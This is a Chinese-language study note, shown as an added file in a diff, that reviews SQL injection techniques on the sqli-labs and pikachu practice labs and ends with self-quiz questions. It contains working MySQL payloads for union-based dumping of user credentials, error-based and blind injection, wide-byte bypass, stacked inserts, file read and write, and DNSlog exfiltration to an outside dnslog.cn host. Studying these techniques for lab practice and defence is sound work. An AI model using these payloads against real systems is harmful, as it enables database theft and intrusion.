@@ -1,0 +1,233 @@
+Sql注入基础复习
+
+    SQL 注入经常出现的地方
+    判断闭合方式--有回显和无回显
+    Sql注入的基本步骤
+    Sql注入的基本方法
+    自问自答~
+    作者说~
+
+    有赞点赞，没赞请看完后补票…
+    此文章为干货，但务必实战，自主搭建靶场sql-labs供使用
+    （http://47.94.22.226/sqli-labs/)
+
+SQL 注入经常出现的地方
+
+（用户输入数据和后端数据库产生交互的地方）
+
+    内部实现 / 流程的角度
+
+url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For…
+
+    常用业务点注入
+
+新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框…
+判断闭合方式–有回显和无回显
+
+闭合方式’ " () (‘x’) ((‘x’)) (“x”) ((“x”)) (()) ‘%x%’-------
+（创造错误，使用转义字符或大数等，无法判断闭合方式时，要多方面求证）
+有回显：
+2’ and ‘1’=‘1，若返回结果为id=2时的值，则说明注入类型为’，若返回结果为id=1时的值，说明注入类型为’)
+原因：注入类型为’时，所构造的sql语句为’2’ and ‘1’=‘1’,返回的值为’2’,所以所查询的结果为id=2。注入类型为’)时，所构造的sql语句为(‘2’ and ‘1’=‘1’)，这时会把括号内的值当做布尔值处理。括号内的值为0，最终返回id=1（数字型和字符型的根本在于闭合方式不同，还是在于探究闭合方式）
+无回显：（排除法,一些典型特征闭合方式基本固定）
+搜索select * from table1 where username like ‘% x %’;
+插入数据insert into table1 (username,password,xx1,xx2) values(‘zj’,‘123’,‘xx1’,‘xx2’);
+Sql注入的基本步骤
+
+* 步骤1：
+
+推断数据库语法大概是什么（通过确认语法才能判断大概的闭合方式）
+查询、POST、GET、插入
+例如查询语法：
+select * from [某个表] where id = [参数] limit 0,1;
+select * from [某个表] where id = ‘2’ limit 0,1;
+
+* 步骤2:
+
+让他报错，显示自己的闭合方式，确认请求方式GET/POST
+select * from [某个表] where id = ‘2’ limit 0,1;
+1’ LIMIT 0,1
+’ " ') ") )) ")) ')) +没有闭合
+
+* 步骤3:
+
+验证目标的闭合方式—至关重要
+select * from [某个表] where id = ’ 2’–+ ’ limit 0,1;
+执行之后
+select * from [某个表] where id = ’ 2’
+如果执行成功，闭合方式就是对的，我们需要验证至少两种闭合方式，但必须只有一种是对的
+
+and 1=1 --+ 确认可以夹带私货
+（–+注释的目的是过掉limit如果没有就不用加注释）
+
+以下属于union联合注入的例子，在此之后就应选择攻击方式
+
+* 步骤4:
+
+确定一下，多少个列
+select * from [某个表] where id = ’ 2’ order by 10 --+ ’ limit 0,1;
+判断一下他是否有10列，如果有显示正常，如果没有就报错
+
+（通过二分法判断有多少列）
+select * from [某个表] where id = ’ 2’ order by 3 --+ ’ limit 0,1;
+不报错，所以有3列（小于3也不会报错）
+
+* 步骤5:
+
+使用联合查询（必须出现报错位）
+因为推断出有3列，所以union select 1,2,3
+记住！前面的参数必须出错，否则后面的1，2，3报错位出不来
+id=-2’ union select 1,2,3 --+
+出现报错位，分别问2，3
+（报错不能是闭合方式位错误而报错）
+
+* 步骤6：
+
+开始刺探内部内容
+id=-2’ union select 1,database(),3 --+
+输出数据库库名、表名、列名
+id=-2’ union select 1,table_name,3 from information_schema.tables where table_schema=‘security’ limit 0,1 --+
+id=-2’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘security’ --+
+id=-2’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=‘security’ and table_name=‘users’ --+
+（
+mysql>5.7版本
+information_schema是自带的，相当于数据库户口本
+information_schema的tables保存着所有数据库库名和表名的对应关系
+information_schema的columns保存着库名–表名–列名所有对应关系
+）
+
+* 步骤7：
+
+查询内容
+union select 1,group_concat(username),group_concat(password) from users --+
+（整体流程叫做脱库，为手工注入，也可以进行工具开发自动化注入）
+Sql注入的基本方法
+
+* union联合注入
+
+已有例子
+
+* 报错注入(概率问题，追求极限边界碰撞）
+
+基础版（最基础、最核心）
+mysql 命令行操作select count(*) from table1 -----计算一下你选取的有多少结果，floor(rand(0)2)0、1出现不固定，产生bug
+'union select 1,2,3 from (select count(),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a – -
+使用extractvalue(1,参数）
+’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
+使用updatexml(1,参数,1)
+’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
+优化显示：
+0x3a 等价于 :
+0x7e 等价于 ~
+
+* 堆叠注入
+
+只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。
+
+id=1’;insert into users(username,password)values(‘zj123’,‘xxxx’) --+
+网站是那种需要注册码的注册
+
+* post请求类型需注意
+
+需要进行抓包改包，位置可有user-agent、cookie、x-forward-for
+（某些网站会记录这些信息到数据库）
+注释方式改变-- -，#，or ‘1’='1
+
+* 布尔盲注
+
+方式：
+select database() ;
+展示当前数据库库名
+
+select length(database(),1,1)
+截取数据库库名（haha），从人类的第一个字，截取一个
+
+select ascii(substr(database(),1,1))=104;
+截取数据库名，从人类的第一个字，截取一个并转为acsii码，判断大小
+
+对照acsii表
+
+select ascii(substr(database(),1,1))=104;
+截取数据库库名第一个字，截取1个，转化为ascii码，判断是不是104
+
+实战：
+?id=1’ and (select ascii(substr(database(),1,1))= 115 )–+
+?id=1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))= 115 )–+
+技巧：布尔型盲注最好先猜出他们网站有什么用户名，以一个正确的用户名来当参照
+(找回密码等方式，判断用户名是否存在，小特征利用）
+admin") and (select database()=‘security’) # and确保两个条件都正确
+
+* 与时间盲注--接触不多，还需深挖
+
+（自己写程序python或者使用工具如sqlmap等）
+特点：界面无反应且无法推断闭合方式
+界面上完全没有反应，但是你好像觉得可以注入，不管正确还是错误都是同一个界面
+
+select sleep(5);
+等5s后输出一个0
+
+and if((select database() )=“haha”,sleep(5),null);
+如果数据库是haha，睡5s，如果不是什么都不做
+
+实战：
+id=2’ and sleep(5) --+
+id=2’ and if((select database())=“security”,sleep(5),null)–+
+id=2’ and if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)=‘e’,sleep(5),null)–+
+
+* 宽字节注入
+
+原因：mysql用gbk编码，把2个字符当作一个汉字存在
+%df吃掉\，因为urlencode(')= %5c%27，如果前面加上%df，%df%5c是一个汉字,%27会独立出来
+
+id=-2%df’ union select 1,2,3 --+
+database() 或者使用ASCII16进制编码，来避免“的使用
+
+在post情况下的宽字节注入，得直接在burp的post数据包中修改，因为前端提交的时候和直接在数据包中修改，前端的不会变成中文
+uname=admi%df’ union select 1,2 #&passwd=admin&submit=Submit
+
+* DNSlog注入
+
+弊端：在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池。。。
+DNSlog注入（一般用于盲注，且没有sqlmap的情况下）
+1’ and if((select load_file(concat(‘\\’,(select database()),‘.b48xu1.dnslog.cn\x2’))),1,0) --+
+
+\\pikachu.b48xu1.dnslog.cn\x2
+
+设置my.ini
+[mysqld]
+secure_file_priv=
+否则不支持load_file命令
+
+* （脱库的衍生）文件写入
+
+（没有发现报错位，通过直接创造文件并存储）
+判断配置文件，是否可以进行文件写入
+-1’ union select 1,2,@@global.secure_file_priv – -
+
+into outfile/load_file
+name=-1’ union select 1,load_file(‘C:/a.txt’) --+ 读取c盘下的a.txt文件
+name=-1’ union select 1,load_file(‘C:/a.txt’) into outfile ‘C:/phpstudy_pro/WWW/pikachu/vul/sqli/haha.txt’ --+ 读取c盘的a.txt内容到自己目录下的haha.txt
+这个into outfile不具备创建文件的能力!!!
+在这里插入图片描述
+
+select和group_concat()的区别
+select table_name (只有一个元素，即使空间有剩余）
+select group_concat(table_name) (爆出所有元素）
+自问自答~
+
+1. SQL注入经常出现的地方?注入方式？注入的业务点，至少5个？
+2. 简述一下sql注入流程？
+3. 简述select与group_concat()的区别？
+4. 如何判断闭合方式？简述常见的闭合误导判断因素？
+5. 简述一下报错注入流程？至少使用3种函数
+6. 如何使用Python对布尔盲注和时间盲注进行验证？
+7. 简述越权改密的原理？
+8. 简述宽字节注入原理？
+9. 简述堆叠注入的原理？
+10. 简述http头注入原理？
+11. 如何利用dnslog注入？
+12. 简述分块注入的相关原理？
+
+作者说~
+
+因为是笔记形式的文档，所以不是以正规的方式书写~
